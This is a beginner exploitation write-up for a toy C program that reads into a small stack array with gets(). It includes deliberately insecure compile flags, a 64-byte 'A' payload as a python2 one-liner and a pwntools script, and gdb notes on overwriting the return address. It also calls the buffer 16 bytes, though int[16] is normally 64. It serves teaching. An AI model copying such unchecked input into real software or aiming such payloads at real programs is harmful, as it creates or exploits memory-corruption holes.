---
description: 08/15/2023
---

# 0âƒ£ 00

This is a very beginner-friendly buffer overflow exploit. I hope you enjoy.

> Can you find out how much money you need to send to the bank to make it overflow?
>
> This one is a bit weird... The buffer in the stack gets allocated in a strange way, so you may need to send more than you thought!

## Static Source Code Analysis

````c
```c

#include <stdio.h>
#include <string.h>

int main(void)
{

    int bank[16];

    printf("Welcome to bank 1337! Give us your money: \n");
    gets(bank);
    fflush(stdout);

}
```
````

Compile:

```
gcc 00.c -o 00 -m32 -fno-stack-protector -z execstack -no-pie -g
```

We can see that our bank buffer is storing 16-bytes of data.

<mark style="color:yellow;">It is uses the vulnerable</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`gets()`</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">function in c to store our input. The reason</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">`gets()`</mark> <mark style="color:yellow;"></mark><mark style="color:yellow;">is so dangerous is because it copies all input from STDIN to the buffer without checking size. This allows the user to provide a string that is larger than the buffer size, resulting in an overflow condition. In other words, there are zero checks for our input</mark>.

`fflush(stdout)` is simply just clearing our buffer after use to help the Kernel out for efficiency.

## Exploitation

### Manual Method

<figure><img src="../../.gitbook/assets/image (84).png" alt=""><figcaption></figcaption></figure>

python2:

```
python2 -c 'print "A" * 64' > payload
```

Exploit:

```
./00 < payload
```

<figure><img src="../../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>

### Automated Method (pwntools)

exploit.py:

```python
from pwn import *

# Set the context for the exploit
context.binary = './00'
context.log_level = 'debug'

# Establish a connection to the binary
p = process('./00')

# Send 64 bytes of 'A' as input
payload = b'A' * 64
p.sendlineafter(":", payload)

# Interact with the binary
p.interactive()
```

<figure><img src="../../.gitbook/assets/image (85).png" alt=""><figcaption></figcaption></figure>

## `gdb`

<figure><img src="../../.gitbook/assets/image (87).png" alt=""><figcaption></figcaption></figure>

We can see at this point our A's are being taken from STDIN and being placed onto the stack.

Furthermore, this will result in a segmentation fault, crashing our program due to us overwriting the return address with our A's, overflowing the buffer.&#x20;

